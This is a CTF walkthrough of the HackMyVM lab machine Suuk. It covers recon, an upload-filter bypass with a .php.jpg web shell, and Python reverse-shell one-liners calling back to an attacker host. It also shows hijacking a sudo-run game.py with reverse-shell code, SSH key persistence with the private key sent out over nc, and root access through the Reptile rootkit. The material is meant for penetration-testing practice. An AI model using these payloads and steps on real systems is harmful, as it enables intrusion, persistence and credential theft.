---
title: CTF Walkthrough for HackMyVM Machine Suuk
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Medusa machine, Insecure File Upload]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/box-suuk.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Suuk a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Suuk<br>
Goal: Get two flags<br>
Operating System: Linux<br>
Download link: [Suuk](https://downloads.hackmyvm.eu/suuk.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) ffuf<br>

## Reconnaissance
As usual, we will start with a host discovery scan using fping. This is to discover the IP address of our target on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Suuk/Scans/Service]
└─$fping 10.0.2.9/24 -aqg
<SNIP>
10.0.2.9
10.0.2.13
```
With the target's IP address, we can now perform a service scan to footprint services running on the opened ports of our target.
```bash
┌──(pentester㉿kali)-[~/Suuk/Scans/Service]
└─$nmap -n 10.0.2.13 -sC -sV -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 01:00 BST
Nmap scan report for 10.0.2.13
<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:01:b7:44:54:9a:92:19:58:9e:e7:20:95:ea:7c:a8 (RSA)
|   256 30:f8:78:e1:9d:03:b2:47:da:90:f9:3a:6c:ea:49:43 (ECDSA)
|_  256 69:1f:2d:3d:88:c2:d1:51:51:45:49:23:b1:a8:99:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Formulaire d'upload de fichiers
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
```
We can see that our target runs an SSH and a Web server on ports 22 and 80 respectively. Upon visiting this web application we are greeted with an upload form that accepts only image files.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/1-browse.png){: .center}

Let's first skip this form and fuzz the web application to uncover any hidden file or directory.
```bash
┌──(pentester㉿kali)-[~/Suuk/Scans/Service]
└─$ffuf -ic -c -u http://10.0.2.13/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt

<SNIP>

index.php               [Status: 200, Size: 575, Words: 91, Lines: 18, Duration: 511ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 614ms]
upload                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 4ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 9ms]
:: Progress: [882184/882184] :: Job [1/1] :: 5882 req/sec :: Duration: [0:02:49] :: Errors: 0 ::
```
From the result above we can see a new interesting directory named **upload**. This is surely the directory where the uploaded images are stored. If we upload a test image, we can access this image by browsing the upload directory.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/upload-test.png){: .center}

If we try to upload a web shell with the .php extension we will receive an error message asking us to upload a file containing a valid extension.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/error-msg-1.png){: .center}

Unfortunately, when we change the extension to .jpg the the web application still returns an error message. This might be because it filters files based on the content type.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/error-msg-2.png){: .center}

Let's change the content type of the file in the HTTP header and retry and upload. We will see a successful upload but the server will treat this file as an image because of its extension.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/success-msg-1.png){: .center}

We have successfully uploaded a shell but with a .jpg extension, this extension will prevent the web server from executing the code. Depending on the configuration of the web server, it can execute PHP code in a file as long as the file has .php in its name i.e. even if the file has a second extension like test.php.png the code in the file will be executed. Let's upload a file with the .php.jpg extension.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-suuk/success-msg-2.png){: .center}

Now, we can check if the misconfiguration mentioned above is enabled on our target by attempting to execute the web shell.
```bash
┌──(pentester㉿kali)-[~/Suuk]
└─$curl http://10.0.2.13/upload/shell.php.jpg?cmd=id                               
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Exploitation

We can see from the result above that this misconfiguration is enabled on our target. Next, we can use this web shell to obtain a reverse shell. First, let's start a Netcat listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Suuk/]
└─$nc -lvnp 1234                                  
listening on [any] 1234 ...
```
We can now execute the Python code below on our target to start a tty reverse shell.
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.9",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Suuk]
└─$curl http://10.0.2.13/upload/shell.php.jpg?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.0.2.9%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

When we go back to the listener, we will notice a connection from our target.
```bash
┌──(pentester㉿kali)-[~/Suuk/Scans/Service]
└─$nc -lvnp 1234                                  
listening on [any] 1234 ...
connect to [10.0.2.9] from (UNKNOWN) [10.0.2.13] 37346
www-data@kuus:/var/www/html/upload$ whoami
whoami
www-data
www-data@kuus:/var/www/html/upload$ 
```

With this access, we can start internal enumeration of the target's system. We will notice the www-data's .bash_history file in the web root directory.
```bash
www-data@kuus:/var/www$ ls -la
ls -la
<SNIP>
-rw-------  1 www-data www-data  166 May  2  2021 .bash_history
drwxr-xr-x  3 www-data www-data 4096 May  2  2021 html
www-data@kuus:/var/www$ cat .bash_history
cat .bash_history
export TERM=xterm
clear
ls
ls -al
cd /reptile
ls
ls -al
clear
cd ..
clear
cd /opt
ls
cd games
cd /home
ls
cd mister_b
clear
cd tignasse
ls
cat pass.txt
less
```

This file reveals the presence of an uncommon directory named reptile in the root directory of the file system. Also, we can notice the presence of an interesting file named **pass.txt** in tignasse's home directory. From its name this file may contain tignasse's password let's visit this directory and read the file.
```bash
www-data@kuus:/home$ ls -la tignasse
ls -la tignasse
total 32
drwxr-xr-x 4 tignasse tignasse 4096 May  2  2021 .
drwxr-xr-x 4 root     root     4096 May  2  2021 ..
-r-------- 1 tignasse tignasse    0 May  2  2021 .bash_history
-rw-r--r-- 1 tignasse tignasse  220 May  2  2021 .bash_logout
-rw-r--r-- 1 tignasse tignasse 3554 May  2  2021 .bashrc
drwx------ 2 tignasse tignasse 4096 May  2  2021 .gnupg
drwxr-xr-x 3 tignasse tignasse 4096 May  2  2021 .local
-rw-r--r-- 1 tignasse tignasse   22 May  2  2021 .pass.txt
-rw-r--r-- 1 tignasse tignasse  807 May  2  2021 .profile
www-data@kuus:/home$ cat tignasse/.pass.txt
cat tignasse/.pass.txt
Try harder !
www-data@kuus:/home/tignasse$ more .pass.txt
more .pass.txt
<REDACTED>
```
*NB: The difference in output is due to the presence of some characters that are interpreted differently by cat and more*.

We can use this password to log in as tignasse using SSH.
```bash
┌──(pentester㉿kali)-[~/Suuk]
└─$ssh tignasse@10.0.2.13                                                     
tignasse@10.0.2.13's password: 
<SNIP>
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tignasse@kuus:~$ 
```

## Post Exploitation
At this point in our assessment, we have successfully obtained an SSH session as a local user on the target. Let's use this user to perform lateral movement and privilege escalation. When we look at this user's sudo right we see that the user tignasse can run a Python game located in the /opt/game directory as mister_b.
```bash
tignasse@kuus:/opt$ sudo -l
Matching Defaults entries for tignasse on kuus:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tignasse may run the following commands on kuus:
    (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py
```

Let's visit this directory and examine the game.
```bash
tignasse@kuus:~$ cd /opt
tignasse@kuus:/opt$ ls -l
total 4
drwxrwx--- 2 mister_b tignasse 4096 Sep 14 13:10 games
tignasse@kuus:/opt$ cd games
tignasse@kuus:/opt/games$ ls -l
total 4
-rw-r--r-- 1 mister_b mister_b 1139 Sep 14 13:10 game.py
tignasse@kuus:/opt/games$ cat game.py 
import random
import os
import re
os.system('cls' if os.name=='nt' else 'clear')
while (1 < 2):
    print "\n"
    print "Rock, Paper, Scissors - Shoot!"
    userChoice = raw_input("Choose your weapon [R]ock], [P]aper, or [S]cissors: ")
    if not re.match("[SsRrPp]", userChoice):
        <SNIP>
    elif opponenetChoice == 'P' and userChoice.upper() == 'R':      
        print "Paper beat rock, I win! "
        continue
    else:       
        print "You win!"
```

From the result above we see that the user input accepted by the game is not used in any execution hence we can forget the idea of a command execution vulnerability. What is interesting is that the directory **game** belongs to our user's group and we have written permission on this directory. This means we can add or delete files in this directory.<br> *NB: In a real-world assessment avoid deleting clients' files or folders instead you can make a backup of these files before deleting them*.<br> We can copy the original game to the /tmp directory and add a fake file with  the same name but with a reverse shell in it.
```bash
tignasse@kuus:/opt/games$ cp game.py /tmp
tignasse@kuus:/opt/games$ rm game.py
rm: remove write-protected regular file 'game.py'? y
```

We can add the following Python code to our fake game.py file.
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.9",1235))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```
Now we can start a listener on our attack host and execute the fake game.py file using sudo right.
```bash
┌──(pentester㉿kali)-[~/Suuk]
└─$nc -lvnp 1235                                               
listening on [any] 1235 ...
```

```bash
tignasse@kuus:/opt/games$ nano game.py 
tignasse@kuus:/opt/games$ sudo -u mister_b /usr/bin/python /opt/games/game.py
```

We can go back to our listener and we shall see a reverse connection established by the target. We can use this access to read the user flag as shown below.
```bash
┌──(pentester㉿kali)-[~/Suuk]
└─$nc -lvnp 1235                                               
listening on [any] 1235 ...
connect to [10.0.2.9] from (UNKNOWN) [10.0.2.13] 46360
mister_b@kuus:/opt/games$ whoami
whoami
mister_b
mister_b@kuus:/opt/games$ ls ~
ls ~
user.txt
```

This step is optional but in case we were in a real assessment we would like to achieve persistence on the target as this user. Since we don't have this user's login credentials we can create SSH keys on the target and download the private on our attack host.
```bash
mister_b@kuus:~$ mkdir .ssh
mkdir .ssh
mister_b@kuus:~$ chmod 700 .ssh
chmod 700 .ssh
mister_b@kuus:~$ cd .ssh
cd .ssh
mister_b@kuus:~/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mister_b/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mister_b/.ssh/id_rsa.
Your public key has been saved in /home/mister_b/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:i1EugVYEcZJXFXemARC2eXTKkCSq9uB9VHWVRVd8YK4 mister_b@kuus
The key\'s randomart image is:
+---[RSA 2048]----+
|    +==oB=*o=.***|
|    .*.o.B = B. +|
|    +.. = + . . .|
|   o   = .   .   |
|  +   + S   E    |
| o + . + .       |
|  . o o .        |
|     .           |
|                 |
+----[SHA256]-----+
mister_b@kuus:~/.ssh$ mv id_rsa.pub authorized_keys
mv id_rsa.pub authorized_keys
```
Now that we have created the .ssh directory and generated the keys for this user let's download the private key on our attack host using Netcat.
##### Start a listener
```bash
┌──(pentester㉿kali)-[~/Suuk/Misc File]
└─$nc -lvnp 7070 > mister_id_rsa  
listening on [any] 7070 ..
```

##### Send the key
```bash
mister_b@kuus:~/.ssh$ nc -q 0 10.0.2.9 7070 < id_rsa
nc -q 0 10.0.2.9 7070 < id_rsa
```
#### Confirm the transfer
```bash
┌──(pentester㉿kali)-[~/Suuk/Misc File]
└─$nc -lvnp 7070 > mister_id_rsa  
listening on [any] 7070 ...
connect to [10.0.2.9] from (UNKNOWN) [10.0.2.13] 52972
```
Next, let's connect to the target with this private key and enjoy our stable SSH shell session.<br>
*NB: Don't forget to change the permission of the key file to 600 before connecting or you shall get an error.*
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Suuk/Misc File]
└─$ssh mister_b@10.0.2.13 -i mister_id_rsa 
Linux kuus 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
<SNIP>
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
mister_b@kuus:~$ 
```

As a penetration tester is not uncommon to come across new tools and technologies every day, when this happens, Google can be of great help. Remember above in www-data's bash history file we saw an uncommon directory in the root directory of the filesystem named reptile. This is not a directory's name we see every day. A quick Google search will show us that a tool known as [Reptile](https://github.com/f0rb1dd3n/Reptile/wiki/Local-Usage) is used to  hide files and folders that have the string reptile in their names and that it can also be used to give root to unprivileged users. When we navigate to that directory and try the command used to show all hidden files it works.
```bash
mister_b@kuus:~$ cd /reptile
mister_b@kuus:~$ ls
mister_b@kuus:/reptile$ /reptile/reptile_cmd show
Success!
mister_b@kuus:/reptile$ ls
reptile  reptile_cmd  reptile_rc  reptile_shell  reptile_start
```
*NB: These files can't be seen by using the ls command*
 Now that we confirm the presence of the tool on our target let's see if this can give us access to a root shell.
 ```bash
mister_b@kuus:/reptile$ ./reptile_cmd root
You got super powers!
root@kuus:/reptile# ls /root
Reptile  root.txt
root@kuus:/reptile# 
```
Great, this tool works and has granted us root access. We can use this access to read the second flag as shown above.

## Conclusion
Congratulations! In this walkthrough, you have learned to bypass some common filters used in upload forms to achieve insecure file upload. Also, you have learned how to hijack files that can be executed with sudo privileges to achieve lateral movement. This machine was designed to show how improper handling of file extensions in upload forms and misconfiguration of web servers can seriously impact the security posture of an organisation. Thank you for following up on this walkthrough.
